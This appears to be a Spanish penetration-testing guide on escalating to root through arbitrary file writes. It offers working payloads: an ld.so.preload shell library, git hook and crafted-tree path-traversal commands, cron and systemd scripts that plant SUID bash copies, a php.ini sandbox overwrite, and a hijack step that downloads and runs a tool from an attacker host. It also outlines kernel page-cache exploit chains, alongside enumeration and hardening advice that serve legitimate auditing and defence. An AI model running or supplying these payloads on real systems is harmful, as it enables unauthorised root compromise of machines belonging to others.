# Escritura arbitraria de archivos como root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` es una lista de objetos compartidos de todo el sistema que el enlazador dinámico carga antes que otros objetos compartidos. El modo de ejecución segura aplica restricciones adicionales a la precarga, por lo que una ruta de biblioteca como `/tmp/pe.so` no es una técnica universal para binarios SUID.\
Si puedes crear o modificar este archivo, un proceso que lo cargue también cargará la biblioteca indicada antes que sus otros objetos compartidos, lo que permite ejecutar código en el contexto de ese proceso.<sup>[[12]](#references)</sup>

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** son scripts ejecutables que se ejecutan ante eventos en un repositorio, incluidas las operaciones de commit y merge. Si un **script o usuario con privilegios** realiza esas acciones y un atacante puede **escribir en la carpeta `.git`**, el hook puede usarse para **escalada de privilegios**.<sup>[[13]](#references)</sup>

Por ejemplo, es posible **generar un script** en un repositorio de git, dentro de **`.git/hooks`**, para que siempre se ejecute cuando se crea un commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal en la exportación de árboles de Git con privilegios

Un sincronizador con privilegios puede evitar un checkout y, en su lugar, enumerar un repositorio influido por un atacante con `git ls-tree`, leer cada blob con `git cat-file`, unir la ruta informada a un directorio de staging y escribirla por su cuenta. Esto se convierte en una **escritura arbitraria de archivos con los privilegios del sincronizador** cuando combina `-c safe.directory=*` (que desactiva la protección de Git para repositorios con otro propietario) con la ausencia de una comprobación de contención del destino. Un nombre absoluto de una entrada del árbol hace que `os.path.join(stage, name)` en Python descarte `stage`; un nombre relativo que contenga `../` escapa cuando el sistema de archivos resuelve la ruta. Como la aplicación materializa el árbol sin procesar en lugar de pedirle a Git que haga el checkout, el rechazo de rutas durante el checkout nunca protege el destino.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Busca este patrón de código en servicios de root, timers, agentes de deployment, importadores de plantillas y tareas de backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Una entrada de tree se codifica como `<mode> SP <name> NUL <raw object ID>`. La opción `git hash-object --literally` permite deliberadamente datos de objeto que el análisis normal o `git fsck` podrían rechazar, por lo que un clon desechable puede crear un tree cuyo nombre de archivo sea un destino absoluto. Este ejemplo crea un blob de archivo cron, lo envuelve en un commit y mueve una branch hasta él; la explotación aún requiere permiso para actualizar un repositorio que consuma el job privilegiado y que el servidor Git acepte el objeto malformado.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

El hardening debe cubrir tanto la incorporación de repositorios como la operación final en el sistema de archivos:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Reemplaza `safe.directory=*` por los repositorios exactos en los que el servicio debe confiar y, cuando sea posible, procesa los repositorios sin privilegios de root.
- Rechaza los nombres absolutos y cualquier componente `.` o `..` antes de materializar los archivos. Después de unir las rutas, canonicalízalas y verifica que el destino permanezca dentro de la raíz prevista.
- Evita las condiciones de carrera de symlinks entre la comprobación y la apertura: abre en relación con un descriptor de directorio de confianza y, en Linux, usa `openat2()` con `RESOLVE_BENEATH` y `RESOLVE_NO_SYMLINKS` para las rutas controladas por un atacante.
- Prefiere un checkout normal en un directorio aislado en lugar de reimplementar el checkout a partir de la salida de plumbing. Si es necesario incorporar objetos en bruto, habilita la validación del lado de recepción, como `receive.fsckObjects=true`; no rebajes la severidad de los hallazgos de `receive.fsck.*` relacionados con nombres de ruta que se necesitan para rechazar árboles manipulados.

### Despliegue de configuración con privilegios

Algunos servicios de administración almacenan el estado de sistema previsto en un archivo de configuración y después lo despliegan con privilegios elevados. Por ejemplo, [openmediavault stores configuration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), y su [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) puede aplicar cambios de servicios. Si una cuenta con menos privilegios puede escribir o reemplazar ese archivo, comprueba si también puede solicitar un despliegue autorizado y si el módulo seleccionado consume como root el campo modificado. Las claves de cuentas SSH, los comandos programados y la instalación de paquetes tienen requisitos previos distintos; la mera presencia de un archivo o de un archivo XML modificable no demuestra que se cumpla ninguno de ellos. Comprueba los permisos del archivo y de los directorios superiores, los grupos del usuario que realiza la llamada y su autorización RPC, la versión instalada y el consumidor real, sin editar la configuración ni invocar una operación de aplicación durante la enumeración.

Las definiciones de acciones de Fail2Ban en `/etc/fail2ban/action.d/` son otro límite de configuración privilegiado. Un usuario que pueda escribir en ese directorio y buscar en él quizá pueda reemplazar una definición de acción o añadir una anulación, pero los permisos del directorio por sí solos no demuestran la ejecución de código. Confirma que una jail habilitada seleccione realmente la acción afectada, que el servicio Fail2Ban la ejecute con privilegios superiores y que se produzcan una recarga o reinicio autorizados, además de un evento de ban coincidente. Un permiso de sudo no relacionado para reiniciar Fail2Ban solo es relevante si se aplica a la invocación exacta del servicio y se carga la definición modificada. [Fail2Ban's action configuration](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) documenta la relación entre el directorio de acciones y las jails; su [sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) muestra que `actionban` se ejecuta cuando se produce un ban, con los privilegios del usuario del servicio. Inspecciona los permisos y la configuración efectiva sin modificar acciones ni provocar bans durante la enumeración.

Existe otro límite cuando una jail habilitada de Fail2Ban usa una acción de correo enriquecida con WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) implicaba texto WHOIS no confiable enviado mediante una tubería a `mail` de GNU mailutils, cuyo procesamiento de escapes podía ejecutar un comando. Un usuario con menos privilegios que pueda escribir archivos quizá pueda influir en la respuesta si puede modificar la configuración de anulación del servidor del **cliente WHOIS seleccionado**; [Debian's `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) documenta uno de esos archivos, pero su ruta y uso varían según la instalación. Revisa la jail/acción efectiva, la identidad del servicio, el cliente WHOIS real y la ruta de su configuración, la implementación de mail, el control de la respuesta y la corrección o backport del proveedor instalados. Un archivo de configuración WHOIS modificable, una versión de Fail2Ban o una acción de mail por sí solos no demuestran esta cadena; durante la enumeración pasiva, evita consultar un servidor externo o provocar bans.

### Creación de archivos mediante TFTP y hooks de paquetes con privilegios

Un servicio TFTP accesible puede cruzar un límite entre contenedores o usuarios locales cuando su configuración **efectiva** de tftpd-hpa se ejecuta como root, expone la raíz del sistema de archivos como directorio `--secure` y habilita `--create`. [The tftpd-hpa manual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) describe las opciones de creación y usuario. Esto puede permitir crear un archivo nuevo en un directorio de configuración privilegiado, incluido `/etc/apt/apt.conf.d/`; aun así, quizá no sea posible reemplazar un archivo existente. [APT's configuration manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) documenta los comandos `APT::Update::Pre-Invoke`. Un `apt update` ejecutado como root puede convertirse en el consumidor con privilegios superiores **solo si** lee el nuevo archivo de configuración. Confirma los argumentos e identidad reales del daemon en ejecución, la accesibilidad de red y el filtrado, la política de creación del directorio de destino, el ámbito efectivo de configuración de APT y una invocación privilegiada posterior. Un archivo predeterminado, un directorio de destino modificable o un comando APT programado por sí solos no demuestran toda la cadena. El triaje pasivo debe limitarse a leer la configuración local y los metadatos, sin subir archivos ni invocar APT.

### Archivos de cron y de hora

Si puedes **escribir archivos relacionados con cron que root ejecuta**, normalmente puedes conseguir ejecución de código la próxima vez que se ejecute el trabajo. Entre los objetivos interesantes se incluyen:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- El crontab del propio root en `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- Timers de `systemd` y los servicios que activan

Comprobaciones rápidas:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Rutas de abuso típicas:

- **Añadir un nuevo cron job de root** a `/etc/crontab` o a un archivo en `/etc/cron.d/`
- **Reemplazar un script** que ya ejecuta `run-parts`
- **Instalar una backdoor en el objetivo de un timer existente** modificando el script o binario que ejecuta

Ejemplo mínimo de payload de cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Si solo puedes escribir dentro de un directorio cron utilizado por `run-parts`, coloca allí un archivo ejecutable:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notas:

- `run-parts` suele ignorar los nombres de archivo que contienen puntos, así que es mejor usar nombres como `backup` en lugar de `backup.sh`.<sup>[[15]](#references)</sup>
- Algunos sistemas usan timers de `systemd` en lugar del cron clásico, pero la idea de abuso es la misma: **modificar lo que root ejecutará más adelante**.<sup>[[20]](#references)</sup>

### Archivos de servicio y socket

Si puedes escribir **archivos de unidad de `systemd`** o archivos a los que estos hagan referencia, quizá puedas lograr la ejecución de código como root al recargar y reiniciar la unidad, o esperando a que se active la ruta de activación del servicio/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Comprueba también el acceso de escritura y búsqueda al propio directorio de unidades del sistema, incluidas las ACL: un usuario puede crear una unidad nueva en `/etc/systemd/system` aunque se deniegue la lectura o el listado del directorio. Esa ruta, por sí sola, no inicia nada. Confirma que el gestor del sistema cargará la unidad nueva, que quien la invoque tiene permisos efectivos para ejecutar `systemctl start` o `restart` con privilegios de root para su nombre (o dispone de otra ruta de activación privilegiada) y que el servicio se ejecuta con la identidad prevista. Una unidad existente ya cargada que se modifica en disco puede requerir `daemon-reload`; las unidades con nombres nuevos tienen un comportamiento de carga distinto. Revisa los argumentos y las exclusiones exactos de sudo antes de considerar suficiente una regla de reinicio con comodines. Consulta la [ruta de búsqueda de unidades de systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) y la [semántica de carga y recarga de systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Entre los objetivos interesantes se incluyen:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Anulaciones mediante drop-in en `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binarios de servicio a los que hagan referencia `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Rutas `EnvironmentFile=` modificables cargadas por un servicio de root

Comprobaciones rápidas:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Vías de abuso comunes:

- **Sobrescribir `ExecStart=`** en una unidad de servicio propiedad de root que puedas modificar
- **Añadir un override drop-in** con un `ExecStart=` malicioso y borrar primero el anterior
- **Instalar un backdoor en el script/binario** al que ya hace referencia la unidad
- **Secuestrar un servicio activado por socket** modificando el archivo `.service` correspondiente que se inicia cuando el socket recibe una conexión

Ejemplo de override malicioso:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Flujo de activación típico:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Si no puedes reiniciar los servicios tú mismo, pero puedes editar una unidad activada por socket, quizá solo tengas que **esperar a que se conecte un cliente** para que se ejecute como root el servicio con backdoor.<sup>[[17]](#references)</sup>

### Directorios de generadores de systemd

Los **generadores del sistema** son ejecutables que el gestor del sistema inicia antes de cargar los archivos de unidad, tanto durante el arranque como al recargar la configuración. Por lo tanto, tener acceso de escritura a un directorio de generadores del sistema (o a un generador ejecutable existente) proporciona una vía directa para ejecutar código como root que es fácil pasar por alto cuando una auditoría solo comprueba archivos `*.service` y `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

El orden de búsqueda habitual es `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` y `/usr/lib/systemd/system-generators/` (algunas distribuciones exponen `/lib/systemd/system-generators/` mediante la fusión de `/usr`). Un ejecutable con el mismo nombre en un directorio anterior oculta al de los directorios posteriores. No confundas estos **directorios de ejecutables de entrada** con `/run/systemd/generator`, `/run/systemd/generator.early` y `/run/systemd/generator.late`, que contienen la salida de unidades transitorias producida por los generadores.<sup>[[35]](#references)</sup>

Comprobaciones rápidas:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Un generator recién creado debe tener establecido su bit ejecutable. Si la primitiva de escritura controla los bytes, pero no los permisos, apunta a un generator que ya sea ejecutable; truncarlo en el mismo sitio normalmente conserva sus metadatos. Si el directorio en sí tiene permisos de escritura, crea una nueva entrada y márcala como ejecutable.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Activar `systemctl daemon-reload` en el administrador del **sistema** requiere autorización adecuada, pero vuelve a ejecutar todos los generadores del sistema; de lo contrario, espera a que se produzca una recarga con privilegios, una operación de paquetes o un reinicio. Los directorios de generadores de usuario, como `~/.config/systemd/user-generators/`, se ejecutan bajo el administrador de usuario y **no** proporcionan acceso root por sí solos.<sup>[[35]](#references)</sup>

Para hardening y hunting, verifica cada componente de la ruta y las ACL, no solo los bits de modo finales; establece una base de referencia de los hashes y la propiedad de los paquetes de los generadores, y genera alertas ante la creación, el cambio de nombre, los cambios de contenido o de permisos en todos los directorios de entrada de los generadores del sistema. Es importante monitorizar la escritura porque un generador de una sola ejecución puede eliminarse después de ejecutarse, mientras que el árbol de unidades generado bajo `/run/systemd/generator*` se vuelve a crear con la siguiente recarga.<sup>[[35]](#references)[[36]](#references)</sup>

### Sobrescribir un `php.ini` restrictivo usado por un sandbox de PHP con privilegios

Algunos daemons personalizados validan el PHP proporcionado por el usuario ejecutando `php` con un **`php.ini` restringido** (por ejemplo, `disable_functions=exec,system,...`). Si el código en el sandbox todavía tiene **cualquier primitiva de escritura** (como `file_put_contents`) y puedes acceder a la **ruta exacta de `php.ini`** que usa el daemon, puedes **sobrescribir esa configuración** para eliminar las restricciones y luego enviar un segundo payload que se ejecute con privilegios elevados.<sup>[[2]](#references)</sup>

Flujo típico:

1. El primer payload sobrescribe la configuración del sandbox.
2. El segundo payload ejecuta código, ahora que las funciones peligrosas están habilitadas de nuevo.

Ejemplo mínimo (sustituye la ruta que usa el daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Si el daemon se ejecuta como root (o valida usando rutas propiedad de root), la segunda ejecución obtiene un contexto root. Esto es, en esencia, una **escalada de privilegios mediante la sobrescritura de la configuración** cuando el runtime aislado todavía puede escribir archivos.

### binfmt_misc

`binfmt_misc` expone registros en `/proc/sys/fs/binfmt_misc`; cada registro asocia un patrón de tipo de archivo con un intérprete. El impacto en los privilegios depende de quién puede cambiar el registro y de qué proceso ejecuta posteriormente el archivo coincidente, así que verifica esos requisitos antes de considerar esto una vía de escalada de privilegios.<sup>[[21]](#references)</sup>

Un helper ejecutable con `CAP_DAC_OVERRIDE` puede proporcionar una vía de registro independiente si acepta datos controlados por quien lo invoca y los escribe en `/proc/sys/fs/binfmt_misc/register`, incluso cuando quien lo invoca no puede escribir directamente en ese nodo. Revisa la entrada y el comportamiento de escritura del helper sin ejecutarlo durante la enumeración. Si una regla registrada usa el flag `C`, el intérprete recibe credenciales basadas en el binario coincidente; por lo tanto, un binario coincidente SUID propiedad de root puede ejecutar un intérprete controlado por quien lo invoca como root. Confirma el montaje de `binfmt_misc` y su política de registro, la capability efectiva del helper, la regla exacta y la ruta del intérprete, el destino ejecutable SUID, y si `no_new_privs` o un montaje `nosuid` suprimen la transición SUID. Un bit de capability o una cadena de ruta incrustada por sí solos son solo pistas para revisar.<sup>[[21]](#references)</sup> Consulta [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) para conocer las condiciones que suprimen SUID.

### Sobrescribir los manejadores de esquema (como http: o https:)

Los entornos de escritorio utilizan asociaciones MIME y entradas de escritorio para elegir una aplicación para los esquemas URI; un atacante que pueda escribir en los directorios de configuración por usuario y de entradas de escritorio pertinentes puede redirigir esos esquemas a un launcher bajo su control. Al modificar el archivo `$HOME/.config/mimeapps.list` para que los manejadores de URL HTTP y HTTPS apunten a un archivo malicioso (por ejemplo, `x-scheme-handler/http=evil.desktop` y `x-scheme-handler/https=evil.desktop`), un clic del usuario puede invocar esa entrada de escritorio.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root ejecutando scripts/binarios modificables por el usuario

Si un flujo de trabajo privilegiado ejecuta algo como `/bin/sh /home/username/.../script` (o cualquier binario dentro de un directorio propiedad de un usuario sin privilegios), puedes secuestrarlo:<sup>[[1]](#references)</sup>

- **Detectar la ejecución:** monitoriza los procesos con pspy para detectar cuándo root invoca rutas controladas por el usuario.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Confirmar que se puede escribir:** asegúrate de que tanto el archivo objetivo como su directorio sean propiedad de tu usuario y que puedas escribir en ellos.
- **Secuestrar el objetivo:** haz una copia de seguridad del binario/script original y coloca un payload que cree una shell SUID (o realice cualquier otra acción como root); luego restaura los permisos:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Activa la acción privilegiada** (p. ej., pulsa un botón de la UI que inicie el helper). Cuando root vuelva a ejecutar la ruta secuestrada, obtén la shell con privilegios elevados mediante `./rootshell -p`.

### Modificación de archivos privilegiados solo en la page cache

Algunos bugs del kernel no modifican el archivo **en disco**. En su lugar, permiten modificar únicamente la **copia en la page cache** de un archivo legible. Si puedes apuntar a un binario **setuid** o que se ejecute como **root**, la siguiente ejecución puede usar bytes controlados por el atacante desde la memoria y escalar privilegios aunque el hash del archivo en disco no haya cambiado.<sup>[[3]](#references)[[4]](#references)</sup>

Es útil pensar en esto como una **primitiva de escritura de archivos solo en tiempo de ejecución**:<sup>[[3]](#references)</sup>

- **El disco queda intacto**: el inode y los bytes en disco no cambian
- **La memoria queda modificada**: los procesos que leen o ejecutan la página almacenada en caché reciben el contenido modificado por el atacante
- **El efecto es temporal**: el cambio desaparece tras reiniciar o desalojar la caché

Esta primitiva se sitúa entre la **escritura arbitraria de archivos** clásica y los bugs más antiguos de abuso de la page cache, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependía de una race
- Dirty Pipe tenía restricciones en la posición de escritura
- Una primitiva que solo afecta a la page cache puede ser más fiable si la ruta vulnerable permite escribir directamente en páginas de archivos almacenadas en caché

#### Flujo genérico de privesc

1. Obtén una primitiva del kernel que pueda escribir en **páginas de la page cache respaldadas por archivos**
2. Úsala contra un **binario privilegiado legible** u otro archivo ejecutado por root
3. Activa su ejecución **antes** de que la página sea desalojada de la caché
4. Obtén ejecución de código como root mientras el archivo en disco sigue pareciendo intacto

Objetivos típicos de gran valor:

- Binarios **setuid-root**
- Helpers iniciados por **servicios root**
- Binarios que suelen ejecutarse desde **contenedores que comparten el kernel/page cache del host**

#### Ruta de ejemplo de AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) es un buen ejemplo de esta clase. La ruta vulnerable estaba en la API de crypto de Linux para userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` puede transferir referencias a páginas de la page cache de un archivo legible a la scatterlist TX de crypto
- La ruta de descifrado in-place de `algif_aead` reutilizaba los buffers de origen y destino
- A continuación, `authencesn` escribía en la región de la etiqueta de destino
- Si esa región aún hacía referencia a páginas de archivos transferidas mediante splice, la escritura llegaba a la **page cache del archivo objetivo**

Así que la técnica interesante no es el CVE en sí, sino el patrón:

- **introducir páginas de caché respaldadas por archivos en un subsistema del kernel**
- hacer que el subsistema las **trate como salida escribible**
- activar una sobrescritura pequeña y controlada en memoria

El PoC público usaba **escrituras repetidas de 4 bytes** para parchear `/usr/bin/su` en memoria y luego lo ejecutaba.<sup>[[4]](#references)[[7]](#references)</sup>

#### Ruta de ejemplo de clonación ESP / XFRM + netfilter TEE

DirtyClone (CVE-2026-43503) muestra otra variante del mismo patrón de **escritura a root solo en la page cache**, pero esta vez el destino es el **descifrado IPsec ESP** en lugar de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La técnica importante es el **paso de lavado de metadatos**:

- `splice()` coloca una **página de la page cache respaldada por un archivo de solo lectura** en un paquete ESP-in-UDP
- La mitigación original de DirtyFrag marcaba ese skb con `SKBFL_SHARED_FRAG` para que `esp_input()` **copiara antes de descifrar**
- netfilter `TEE` duplica el paquete mediante `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- El clon conserva la **misma referencia física a la página de la page cache**, pero pierde `SKBFL_SHARED_FRAG`
- Entonces, `esp_input()` considera que el clon es seguro y ejecuta el descifrado **in-place de `cbc(aes)`** sobre la página respaldada por el archivo

Así que la lección para quien revisa el código va más allá del CVE: si una mitigación depende de **metadatos de skb/página** para decidir si primero debe copiar, cualquier **ruta de clonación/copia que conserve la página subyacente pero descarte los metadatos** puede reabrir silenciosamente la primitiva de escritura.

Flujo de explotación típico:

1. Usa `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obtener **`CAP_NET_ADMIN` dentro de un namespace de red privado**
2. Activa loopback e instala una **regla netfilter `TEE`** en `mangle/OUTPUT`
3. Instala SAs de transporte XFRM ESP mediante `NETLINK_XFRM`
4. Codifica cada palabra objetivo de 4 bytes en el campo `seq_hi` de la SA (el truco de selección de palabras de DirtyFrag)
5. Envía el paquete ESP-in-UDP transferido mediante splice para que el **clon TEE** llegue a `esp_input()` y se descifre **in-place**
6. Repite hasta que la copia de `/usr/bin/su` en la page cache, u otro ejecutable privilegiado, contenga código controlado por el atacante

En la práctica, el impacto es el mismo que en el ejemplo de `AF_ALG`: el archivo en disco queda intacto, pero `execve()` consume los **bytes modificados de la page cache** y otorga root.<sup>[[8]](#references)[[9]](#references)</sup>

Comprobaciones útiles de exposición para esta variante:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

La reducción de la superficie de ataque a corto plazo también es específica de cada ruta: actualizar a un kernel que incluya `48f6a5356a33` corrige la ruta de `clone`, mientras que bloquear la carga automática de `xt_TEE` elimina el **paso de blanqueo de flags** y bloquear `esp4` / `esp6` elimina el **sumidero de descifrado**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposición y búsqueda

Si sospechas de esta clase de vulnerabilidad, no te fíes únicamente de las comprobaciones de integridad del disco. Verifica también:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Los valores de configuración siguientes distinguen una interfaz cargable de una integrada en el kernel; las reglas de compilación de crypto asignan `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` puede cargarse o descargarse como módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: la interfaz está integrada en el kernel
- los binarios setuid son buenos objetivos, porque un parche que solo afecte a la page cache puede bastar para convertir un acceso local inicial en root

#### Reducción de la superficie de ataque de la ruta `algif_aead`

Si la interfaz vulnerable la proporciona un módulo cargable:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Si está compilado en el kernel, algunas divulgaciones informaron de bloquear la ruta de init con:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Este tipo de mitigación también conviene tenerla presente para otros LPE del kernel: si la explotación depende de una interfaz opcional específica, deshabilitarla o incluirla en una blacklist puede interrumpir la ruta del exploit incluso antes de que haya una actualización completa del kernel disponible.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo: secuestro de un script ejecutado como root en un directorio de PaperCut escribible por usuarios](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431), preguntas frecuentes](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgación de Openwall oss-security para CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Corrección de Linux stable: crypto: algif_aead - Revertir a la operación fuera de lugar](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail: aviso de CVE-2026-31431](https://copy.fail/)
- [7] [Análisis técnico de Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositorio / README de DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: análisis y explotación de la variante DirtyClone de Linux LPE (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Corrección de Linux: net: skb: conservar `SKBFL_SHARED_FRAG` en `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigación anterior de Linux: establecer `SKBFL_SHARED_FRAG` para paquetes UDP divididos (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8): página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5): página del manual de Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8): página del manual de Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc: documentación del kernel de Linux](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Asociaciones de aplicaciones MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Especificación Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Especificación Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
